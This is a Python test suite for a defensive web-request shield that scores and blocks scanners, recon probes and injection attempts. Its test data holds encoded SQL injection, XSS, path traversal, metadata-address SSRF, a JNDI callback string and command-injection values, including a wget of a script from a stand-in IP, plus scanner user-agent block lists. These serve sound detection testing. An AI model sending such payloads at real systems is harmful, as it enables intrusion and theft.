"""Simulated traffic against the shield. No network, no real scanners: each
test replays the request shapes ARTEX and its toolchain produce."""
import asyncio
import io
import logging
import os
import random
import tempfile
import threading
import time
import unittest
from datetime import datetime, timedelta, timezone
from unittest import mock

from artex_shield import (Config, Engagement, Shield, ShieldASGI, ShieldWSGI,
                          html_trap, js_trap, make_canaries, robots_txt_block)
from artex_shield import core, signatures

CHROME = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
          "Chrome/131.0.0.0 Safari/537.36")
BROWSER = {"User-Agent": CHROME, "Accept": "text/html", "Accept-Language": "en-US,en;q=0.9"}
T0 = 1_800_000_000.0
logging.getLogger("artex_shield").disabled = True      # keep test output readable


class Clock:
    def __init__(self):
        self.t = T0

    def __call__(self):
        return self.t


def shield(**kw):
    clock = Clock()
    kw.setdefault("mode", "enforce")
    return Shield(Config(**kw), clock=clock), clock


class Signatures(unittest.TestCase):
    def test_artex_harvester_blocked_on_sight(self):
        s, _ = shield()
        d = s.check("203.0.113.5", "GET", "/", headers={"User-Agent": "Mozilla/5.0 (spa-api-recon)"})
        self.assertEqual(d.action, "block")
        self.assertIn("artex:api-recon-harvester", d.hits)
        # ...and stays blocked with a clean browser disguise.
        self.assertEqual(s.check("203.0.113.5", "GET", "/", headers=BROWSER).action, "block")

    def test_bundled_scanners_blocked(self):
        for ua in ["sqlmap/1.9.9#stable (https://sqlmap.org)", "Fuzz Faster U Fool v2.3.0",
                   "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)",
                   "Nuclei - Open-source project (github.com/projectdiscovery/nuclei)"]:
            s, _ = shield()
            self.assertEqual(s.check("203.0.113.6", "GET", "/", headers={"User-Agent": ua}).action, "block", ua)

    def test_http_library_alone_is_not_throttled(self):
        s, c = shield()
        for _ in range(200):                      # an API client polling with irregular gaps
            c.t += random.uniform(3, 40)
            d = s.check("198.51.100.7", "GET", "/api/items", headers={"User-Agent": "python-requests/2.32"})
            self.assertEqual(d.action, "pass")

    def test_soft_signals_never_throttle_however_long_they_run(self):
        # An HTTP library polling on the second raises two soft signals (library
        # User-Agent, even cadence). Each repeats once per half-life, so the sum
        # must be watched over several half-lives, not one.
        s, c = shield()
        for _ in range(2 * 3600):
            c.t += 1.0
            d = s.check("198.51.100.8", "GET", "/api/items", headers={"User-Agent": "python-requests/2.32"})
            self.assertEqual(d.action, "pass", f"after {c.t - T0:.0f} s: {d.hits}")
            s.observe("198.51.100.8", "/api/items", 200)
        self.assertLess(s._tracks["198.51.100.8"].score, s.cfg.throttle_score)

    def test_soft_signals_on_one_request_do_not_throttle(self):
        s, _ = shield()                           # headless browser that sends no Accept-Language
        headless = {"User-Agent": CHROME.replace("Chrome/", "HeadlessChrome/")}
        d = s.check("198.51.100.9", "GET", "/", headers=headless)
        self.assertEqual(sorted(d.hits), ["shape:browser-ua-without-browser-headers", "ua:headless-browser"])
        self.assertEqual(d.action, "pass")
        self.assertLess(d.score, s.cfg.throttle_score)

    def test_soft_signals_still_add_to_hard_evidence(self):
        s, c = shield()
        headless = {"User-Agent": CHROME.replace("Chrome/", "HeadlessChrome/")}
        self.assertEqual(s.check("203.0.113.16", "GET", "/swagger.json", headers=headless).action, "pass")
        s.observe("203.0.113.16", "/swagger.json", 404)           # recon probe: hard evidence
        c.t += 1
        self.assertEqual(s.check("203.0.113.16", "GET", "/", headers=headless).action, "throttle")

    def test_soft_cap_must_stay_below_throttle_score(self):
        self.assertLess(Config().soft_cap, Config().throttle_score)
        self.assertLess(Config(throttle_score=20, block_score=40).soft_cap, 20)
        with self.assertRaises(ValueError):
            Config(soft_cap=50)


class Humans(unittest.TestCase):
    def test_normal_browsing_passes(self):
        s, c = shield()
        rng = random.Random(1)
        for page in range(40):
            c.t += rng.uniform(4, 90)             # reading time
            for asset in range(rng.randint(3, 25)):   # then a burst of assets
                c.t += rng.uniform(0.001, 0.08)
                d = s.check("192.0.2.44", "GET", f"/p/{page}/a{asset}.css", headers=BROWSER)
                self.assertEqual(d.action, "pass")
                s.observe("192.0.2.44", f"/p/{page}/a{asset}.css", 200)
        self.assertEqual(s.stats["blocked"] + s.stats["throttled"], 0)
        self.assertEqual(s._tracks["192.0.2.44"].score, 0)   # not one signal raised

    def test_a_few_404s_are_fine(self):
        s, c = shield()
        for i in range(8):
            c.t += 5
            self.assertEqual(s.check("192.0.2.45", "GET", f"/old-link-{i}", headers=BROWSER).action, "pass")
            s.observe("192.0.2.45", f"/old-link-{i}", 404)


class Behaviour(unittest.TestCase):
    def test_path_enumeration_escalates_to_block(self):
        s, c = shield()
        ua = {"User-Agent": CHROME}               # rotating-UA scanner: browser UA, no browser headers
        actions = []
        for i in range(120):
            c.t += 0.5
            d = s.check("203.0.113.9", "GET", f"/guess-{i}", headers=ua)
            actions.append(d.action)
            if not d.stop:
                s.observe("203.0.113.9", f"/guess-{i}", 404)
        self.assertIn("throttle", actions)
        self.assertEqual(actions[-1], "block")

    def test_recon_paths_only_count_when_they_404(self):
        s, c = shield()
        for p in ["/graphql", "/swagger.json", "/actuator/health", "/admin/"]:   # site really has these
            c.t += 1
            self.assertEqual(s.check("192.0.2.50", "GET", p, headers=BROWSER).action, "pass")
            s.observe("192.0.2.50", p, 200)
        s2, c2 = shield()
        last = None
        for p in ["/graphql", "/swagger.json", "/openapi.json", "/v2/api-docs", "/actuator/env"]:
            c2.t += 1
            last = s2.check("203.0.113.10", "GET", p, headers=BROWSER)
            if not last.stop:
                s2.observe("203.0.113.10", p, 404)
        self.assertNotEqual(last.action, "pass")

    def test_sensitive_file_probe(self):
        s, _ = shield()
        d = s.check("203.0.113.11", "GET", "/.env", headers=BROWSER)
        self.assertEqual(d.action, "throttle")
        self.assertEqual(s.check("203.0.113.11", "GET", "/.git/config", headers=BROWSER).action, "block")

    def test_payloads(self):
        cases = ["id=1%27%20UNION%20SELECT%20null,version()--", "q=%3Cscript%3Ealert(1)%3C/script%3E",
                 "file=..%2f..%2f..%2fetc%2fpasswd", "n=%7B%7B7*7%7D%7D", "u=http://169.254.169.254/latest/",
                 "x=%2527%2520or%2520%25271"]     # double-encoded
        for q in cases:
            s, _ = shield()
            d = s.check("203.0.113.12", "GET", "/search", q, BROWSER)
            self.assertTrue(any(h.startswith("payload:") for h in d.hits), q)
            self.assertEqual(d.action, "throttle", q)
            self.assertEqual(s.check("203.0.113.12", "GET", "/search", q, BROWSER).action, "block", q)

    def test_oob_marker_in_header(self):
        s, _ = shield()
        h = dict(BROWSER, Referer="${jndi:ldap://c9abc.oast.fun/a}")
        d = s.check("203.0.113.13", "GET", "/", headers=h)
        self.assertIn("payload:jndi", d.hits)
        self.assertEqual(d.action, "block")       # jndi + callback domain

    def test_ordinary_search_text_is_not_a_payload(self):
        s, _ = shield()
        for q in ["q=select+a+union+rep", "q=sleep+tips", "q=o'reilly+books", "next=/account/settings"]:
            self.assertEqual(s.check("192.0.2.60", "GET", "/search", q, BROWSER).hits, [], q)

    def test_ordinary_query_strings_are_not_payloads(self):
        # `&`, `|` and `;` hold query strings and lists together; a parameter or
        # list item called id, cat, sh, nc, uname or curl is not a shell command.
        s, _ = shield()
        for path, q in [("/products", "page=2&id=5"), ("/blog", "p=1&cat=3"), ("/search", "tags=dog|cat"),
                        ("/api/items", "fields=name|id|price"), ("/api/items", "cols=uname;id;sh"),
                        ("/list", "a=1&sh=2&nc=3&uname=bob&curl=4&wget=5&bash=6"),
                        ("/list", "color=red;id=5;cat=3"), ("/login", "next=%2Fitems%3Fpage%3D2%26id%3D5"),
                        ("/items;id=5", "page=2"), ("/search", "q=R%26D+jobs&id=3"), ("/go", "a=1&&id=5")]:
            self.assertEqual(s.check("192.0.2.61", "GET", path, q, BROWSER).hits, [], f"{path}?{q}")

    def test_command_injection_is_still_scored(self):
        for q in ["host=127.0.0.1%3Bcat%20%2Ftmp%2Fkey", "host=x%7Cwhoami", "host=x%26%26id", "host=x%7C%7Cid",
                  "host=%60id%60", "host=%24(id)", "host=x%3Bwget%20http%3A%2F%2F198.51.100.1%2Fa.sh",
                  "host=x%7Csh%20-c%20ls", "host=x;uname -a", "host=x%253Bcurl%2520198.51.100.1"]:
            s, _ = shield()
            self.assertIn("payload:cmdi", s.check("203.0.113.17", "GET", "/ping", q, BROWSER).hits, q)

    def test_metronomic_cadence_is_flagged_but_soft(self):
        s, c = shield()
        rng = random.Random(2)
        hits = []
        for _ in range(60):                       # ARTEX "quiet" profile: 2 req/s, <=250 ms jitter
            c.t += 0.5 + rng.uniform(0, 0.25)
            d = s.check("203.0.113.14", "GET", "/api/items", headers=BROWSER)
            hits += d.hits
        self.assertEqual(hits.count("behavior:metronomic-cadence"), 1)
        self.assertEqual(d.action, "pass")        # one soft signal never throttles on its own

    def test_ignoring_retry_after_escalates(self):
        s, c = shield()
        s.check("203.0.113.15", "GET", "/.env", headers=BROWSER)          # 60 -> throttled
        d = None
        for _ in range(12):                       # hammering inside the Retry-After window
            c.t += 1
            d = s.check("203.0.113.15", "GET", "/", headers=BROWSER)
        self.assertEqual(d.action, "block")

    def test_backing_off_recovers(self):
        s, c = shield()
        d = s.check("192.0.2.70", "GET", "/.env", headers=BROWSER)
        self.assertEqual(d.action, "throttle")
        self.assertEqual(d.retry_after, 159)      # 600 s * log2(60/50), rounded up, +1
        c.t += d.retry_after                     # waited as told
        self.assertEqual(s.check("192.0.2.70", "GET", "/", headers=BROWSER).action, "pass")


class Decoys(unittest.TestCase):
    def test_canary_is_instant_block(self):
        canaries = make_canaries("site-secret")
        s, _ = shield(canary_paths=canaries)
        self.assertEqual(s.check("192.0.2.80", "GET", "/", headers=BROWSER).action, "pass")
        d = s.check("192.0.2.80", "GET", canaries[0], headers=BROWSER)
        self.assertEqual((d.action, d.hits), ("block", ["decoy:canary-path"]))

    def test_canaries_match_what_artex_harvests(self):
        # ARTEX's static harvester (skills/api-recon/scripts/harvest_static.py) keeps a
        # quoted path when a segment looks like an API prefix and it has no asset extension.
        prefixes = {"api", "rest", "service", "services", "gateway", "graphql", "web", "admin", "backend", "open"}
        assets = {"js", "css", "png", "jpg", "jpeg", "svg", "gif", "woff", "woff2", "ttf", "ico", "map", "json",
                  "mp4", "webp"}
        for c in make_canaries("site-secret", 5):
            self.assertIn(f'"{c}"', js_trap(c))
            self.assertRegex(c, r"^/[A-Za-z0-9_\-./]+$")
            segments = c.strip("/").split("/")
            self.assertTrue(prefixes & set(segments), c)
            self.assertNotIn(segments[-1].rsplit(".", 1)[-1].lower(), assets, c)

    def test_helpers(self):
        c = make_canaries("k", 2)
        self.assertEqual(make_canaries("k", 2), c)
        self.assertNotEqual(make_canaries("other", 2), c)
        self.assertIn(f"Disallow: {c[0]}", robots_txt_block(c))
        self.assertIn('aria-hidden="true"', html_trap(c[0]))


class IFF(unittest.TestCase):
    def setUp(self):
        now = datetime.fromtimestamp(T0, timezone.utc)
        self.eng = Engagement("FS-17", ["198.51.100.0/24"], now - timedelta(hours=1), now + timedelta(hours=1))
        self.ua = {"User-Agent": "ARTEX-Assessment/1.0 (engagement=FS-17)"}

    def test_verified_engagement_is_friendly(self):
        s, _ = shield(engagements=[self.eng])
        d = s.check("198.51.100.24", "GET", "/.env", "id=1' or '1", self.ua)
        self.assertTrue(d.friendly)
        self.assertEqual(d.action, "pass")

    def test_label_from_wrong_address_is_hostile(self):
        s, _ = shield(engagements=[self.eng])
        self.assertEqual(s.check("203.0.113.9", "GET", "/", headers=self.ua).action, "block")

    def test_label_outside_window_is_hostile(self):
        s, c = shield(engagements=[self.eng])
        c.t += 2 * 3600
        self.assertEqual(s.check("198.51.100.24", "GET", "/", headers=self.ua).action, "block")

    def test_wrong_or_missing_reference_is_hostile(self):
        s, _ = shield(engagements=[self.eng])
        for ua in ["ARTEX-Assessment/1.0 (engagement=FS-18)", "ARTEX-Assessment/1.0"]:
            self.assertEqual(s.check("198.51.100.30", "GET", "/", headers={"User-Agent": ua}).action, "block")
            s.unblock("198.51.100.30")

    def test_allow_cidr_and_exempt_path(self):
        s, _ = shield(allow_cidrs=["10.0.0.0/8"], exempt_paths=["/healthz"])
        self.assertEqual(s.check("10.1.2.3", "GET", "/.env", headers={"User-Agent": "sqlmap/1"}).action, "pass")
        self.assertEqual(s.check("203.0.113.1", "GET", "/healthz", headers={"User-Agent": "curl/8"}).score, 0)


class Plumbing(unittest.TestCase):
    def test_monitor_mode_never_stops_a_request(self):
        events = []
        s, _ = shield(mode="monitor", on_event=events.append)
        d = s.check("203.0.113.20", "GET", "/", headers={"User-Agent": "sqlmap/1.9"})
        self.assertEqual((d.action, d.stop), ("block", False))
        self.assertEqual(events[0]["action"], "block")
        self.assertFalse(events[0]["enforced"])

    def test_forwarded_for_trusted_only_from_own_proxy(self):
        s, _ = shield(trusted_proxies=["10.0.0.0/8"])
        self.assertEqual(s.client_ip("10.0.0.2", "203.0.113.7, 10.0.0.9"), "203.0.113.7")
        self.assertEqual(s.client_ip("10.0.0.2", "1.1.1.1, 203.0.113.7"), "203.0.113.7")   # client-forged left side
        self.assertEqual(s.client_ip("203.0.113.99", "8.8.8.8"), "203.0.113.99")           # direct peer: ignore header
        self.assertEqual(s.client_ip("10.0.0.2", "garbage"), "10.0.0.2")

    def test_forwarded_for_hop_with_a_port(self):
        s, _ = shield(trusted_proxies=["10.0.0.0/8"])     # some load balancers append the source port
        self.assertEqual(s.client_ip("10.0.0.2", "203.0.113.7:44321"), "203.0.113.7")
        self.assertEqual(s.client_ip("10.0.0.2", "[2001:db8::7]:443"), "2001:db8::7")
        self.assertEqual(s.client_ip("10.0.0.2", "[2001:db8::7]"), "2001:db8::7")
        self.assertEqual(s.client_ip("10.0.0.2", "1.1.1.1, 203.0.113.7:44321, 10.0.0.9:80"), "203.0.113.7")

    def test_unidentified_client_is_not_scored(self):
        # When the only address available is the proxy's own, or none at all,
        # every visitor would share one track and one scanner would block them all.
        events = []
        s, c = shield(trusted_proxies=["10.0.0.0/8"], on_event=events.append)
        scanner = {"User-Agent": "sqlmap/1.9"}
        for ip in [s.client_ip("10.0.0.2", "unknown"),     # proxy passed on a hop it could not name
                   s.client_ip("10.0.0.2", None),          # proxy sent no header
                   s.client_ip("", "203.0.113.7"),         # unix socket: no peer address
                   "not-an-address"]:
            d = s.check(ip, "GET", "/.env", "id=1' UNION SELECT 1", scanner)
            self.assertEqual((d.action, d.score), ("pass", 0.0), ip)
            self.assertEqual(s.check(ip, "GET", "/", headers=BROWSER).action, "pass", ip)
        self.assertEqual(s.blocklist(), {})
        self.assertEqual(s._tracks, {})
        self.assertEqual(s.stats["unidentified"], 8)
        self.assertEqual([e["action"] for e in events], ["unidentified"])       # one warning, not one per request
        c.t += s.cfg.half_life
        s.check("10.0.0.2", "GET", "/", headers=BROWSER)
        self.assertEqual(len(events), 2)
        # Clients the proxy does name are still scored.
        self.assertEqual(s.check(s.client_ip("10.0.0.2", "203.0.113.7"), "GET", "/", headers=scanner).action, "block")

    def test_unix_socket_peer_can_be_trusted(self):
        s, _ = shield(trusted_proxies=["0.0.0.0/32"])     # the address an absent peer is given
        self.assertEqual(s.client_ip("", "203.0.113.7"), "203.0.113.7")
        self.assertEqual(s.check(s.client_ip("", "203.0.113.7"), "GET", "/", headers={"User-Agent": "sqlmap/1"}).action,
                         "block")
        self.assertEqual(s.check(s.client_ip("", "198.51.100.9"), "GET", "/", headers=BROWSER).action, "pass")

    def test_ipv6_tracked_per_64(self):
        s, _ = shield()
        s.check("2001:db8:1:2::1", "GET", "/", headers={"User-Agent": "sqlmap/1"})
        self.assertEqual(s.check("2001:db8:1:2:ffff::9", "GET", "/", headers=BROWSER).action, "block")
        self.assertEqual(s.check("2001:db8:1:3::1", "GET", "/", headers=BROWSER).action, "pass")

    def test_block_expires_and_repeat_offence_doubles(self):
        s, c = shield()
        bad = {"User-Agent": "sqlmap/1"}
        s.check("203.0.113.30", "GET", "/", headers=bad)
        c.t += 3601
        self.assertEqual(s.check("203.0.113.30", "GET", "/", headers=BROWSER).action, "pass")
        s.check("203.0.113.30", "GET", "/", headers=bad)
        c.t += 3601
        self.assertEqual(s.check("203.0.113.30", "GET", "/", headers=BROWSER).action, "block")   # 2 h this time
        c.t += 3601
        self.assertEqual(s.check("203.0.113.30", "GET", "/", headers=BROWSER).action, "pass")

    def test_blocklist_export(self):
        with tempfile.TemporaryDirectory() as d:
            path = os.path.join(d, "deny.conf")
            s, _ = shield(blocklist_export_path=path)
            s.check("203.0.113.40", "GET", "/", headers={"User-Agent": "sqlmap/1"})
            s.check("2001:db8::1", "GET", "/", headers={"User-Agent": "sqlmap/1"})
            with open(path) as f:
                self.assertEqual(f.read(), "deny 2001:db8::/64;\ndeny 203.0.113.40;\n")

    def test_track_table_is_bounded(self):
        s, _ = shield(max_tracks=100)
        for i in range(1000):
            s.check(f"198.18.{i // 256}.{i % 256}", "GET", "/", headers=BROWSER)
        self.assertEqual(len(s._tracks), 100)

    def test_tls_denylist(self):
        s, _ = shield(tls_header="X-JA4", tls_denylist=["t13d_example"])
        d = s.check("203.0.113.50", "GET", "/", headers=dict(BROWSER, **{"X-JA4": "t13d_example"}))
        self.assertIn("tls:denylisted-fingerprint", d.hits)


class Adapters(unittest.TestCase):
    def test_wsgi(self):
        def app(environ, start_response):
            ok = environ["PATH_INFO"] == "/"
            start_response("200 OK" if ok else "404 Not Found", [("Content-Type", "text/plain")])
            return [b"hi"]

        s, c = shield()
        wrapped = ShieldWSGI(app, s)

        def call(path, ua=CHROME, lang="en", ip="203.0.113.60"):
            env = {"REQUEST_METHOD": "GET", "PATH_INFO": path, "QUERY_STRING": "", "REMOTE_ADDR": ip,
                   "HTTP_USER_AGENT": ua, "HTTP_ACCEPT_LANGUAGE": lang, "wsgi.input": io.BytesIO()}
            out = {}
            body = b"".join(wrapped(env, lambda st, h, e=None: out.update(status=st, headers=dict(h))))
            return out["status"], out["headers"], body

        self.assertEqual(call("/")[0], "200 OK")
        for i in range(15):                       # 404s flow back through observe()
            c.t += 1
            call(f"/nope-{i}")
        self.assertEqual(s._tracks["203.0.113.60"].score, 40)
        status, headers, _ = call("/.env", ip="203.0.113.62")
        self.assertEqual(status, "429 Too Many Requests")
        self.assertGreaterEqual(int(headers["Retry-After"]), 120)
        status, _, body = call("/", ua="sqlmap/1")
        self.assertEqual(status, "403 Forbidden")
        self.assertIn(b"Reference:", body)

    def test_wsgi_without_a_peer_address_blocks_nobody(self):
        def app(environ, start_response):
            start_response("200 OK", [("Content-Type", "text/plain")])
            return [b"hi"]

        s, _ = shield()
        wrapped = ShieldWSGI(app, s)

        def call(ua):                              # served over a unix socket: REMOTE_ADDR is empty
            env = {"REQUEST_METHOD": "GET", "PATH_INFO": "/", "QUERY_STRING": "", "REMOTE_ADDR": "",
                   "HTTP_USER_AGENT": ua, "HTTP_ACCEPT_LANGUAGE": "en", "HTTP_X_FORWARDED_FOR": "203.0.113.7",
                   "wsgi.input": io.BytesIO()}
            out = {}
            b"".join(wrapped(env, lambda st, h, e=None: out.update(status=st)))
            return out["status"]

        self.assertEqual(call("sqlmap/1.9"), "200 OK")
        self.assertEqual(call(CHROME), "200 OK")           # the next visitor is not paying for the scanner

    def test_asgi(self):
        async def app(scope, receive, send):
            await send({"type": "http.response.start", "status": 200, "headers": []})
            await send({"type": "http.response.body", "body": b"hi"})

        s, _ = shield()
        wrapped = ShieldASGI(app, s)

        async def call(ua):
            sent = []
            scope = {"type": "http", "method": "GET", "path": "/", "query_string": b"",
                     "client": ("203.0.113.61", 5555),
                     "headers": [(b"user-agent", ua.encode()), (b"accept-language", b"en")]}

            async def send(m):
                sent.append(m)

            await wrapped(scope, None, send)
            return sent[0]["status"]

        self.assertEqual(asyncio.run(call(CHROME)), 200)
        self.assertEqual(asyncio.run(call("Mozilla/5.0 (spa-api-recon spider)")), 403)


class Cost(unittest.TestCase):
    """The shield reads attacker-controlled text on every request, so no input
    may make that slow. Budgets are several times what a linear scan needs."""
    BUDGET = 0.25

    def timed(self, fn):
        best = None
        for _ in range(2):                        # best of two: ignore a scheduling hiccup
            t0 = time.perf_counter()
            fn()
            took = time.perf_counter() - t0
            best = took if best is None else min(best, took)
            if best < self.BUDGET:
                break
        return best

    def test_every_pattern_scans_in_linear_time(self):
        patterns = [("HARD_UA " + label, rx) for rx, _, label in signatures.HARD_UA]
        patterns += [("SOFT_UA " + label, rx) for rx, _, label in signatures.SOFT_UA]
        patterns += [(label, rx) for rx, label in signatures.PAYLOADS + signatures.OOB]
        patterns += [(name, getattr(signatures, name)) for name in
                     ("ASSESSMENT_UA", "BROWSER_UA", "CRAWLER_UA", "SENSITIVE_PATHS", "RECON_PATHS")]
        # Repeated fragments each pattern almost matches: the shape that makes a
        # backtracking engine retry from every position.
        atoms = ["a", "db", "a-", "a.", "/", " ", "1", "mozilla/5.0 ", "ARTEX-Assessment/1 ", "union ", "union all ",
                 "' ", "' or ", "sleep ( ", "; ", "| cat ", "{{1 ", "${ ", "<%= 1", "on", "onload ", "<svg",
                 "backup.", "/wp-config.php.a", "/swagger/", "/admin/", "x.oast", "-.", "curl/"]
        slow = []
        for name, rx in patterns:
            for atom in atoms:
                text = atom * (30000 // len(atom))
                for subject in (text, "/" + text + "!"):
                    took = self.timed(lambda: (rx.search(subject), rx.match(subject)))
                    if took >= self.BUDGET:
                        slow.append(f"{name} on {atom!r} x {len(subject) // len(atom)}: {took:.2f} s")
        self.assertEqual(slow, [])

    def test_oversized_requests_are_checked_quickly(self):
        s, _ = shield()
        padded = dict(BROWSER, **{f"X-Pad-{i}": "a" * 8000 for i in range(60)})
        cases = {"60 padded headers": lambda: s.check("192.0.2.90", "GET", "/", "", padded),
                 "8000-character path": lambda: s.check("192.0.2.91", "GET", "/" + "db" * 4000 + "!", "", BROWSER),
                 "60000-character query": lambda: s.check("192.0.2.92", "GET", "/", "a" * 60000, BROWSER),
                 "20000 query parameters": lambda: s.check("192.0.2.93", "GET", "/", "a=b&" * 20000, BROWSER),
                 "8000-character user agent": lambda: s.check(
                     "192.0.2.94", "GET", "/", "", {"User-Agent": "Mozilla/5.0 " * 660})}
        for name, fn in cases.items():
            self.assertLess(self.timed(fn), self.BUDGET, name)

    def test_request_scanning_does_not_hold_the_lock(self):
        # Decoding and pattern matching depend only on the request. Doing them
        # under the lock would make every other request wait behind a slow one.
        s, _ = shield()
        free, real = [], core._decode

        def decode_and_probe(text):
            def probe():
                got = s._lock.acquire(blocking=False)
                if got:
                    s._lock.release()
                free.append(got)
            other = threading.Thread(target=probe)
            other.start()
            other.join()
            return real(text)

        with mock.patch.object(core, "_decode", decode_and_probe):
            d = s.check("203.0.113.18", "GET", "/search", "q=1%27%20UNION%20SELECT%201", BROWSER)
        self.assertIn("payload:sqli", d.hits)
        self.assertTrue(free and all(free), free)


if __name__ == "__main__":
    unittest.main()
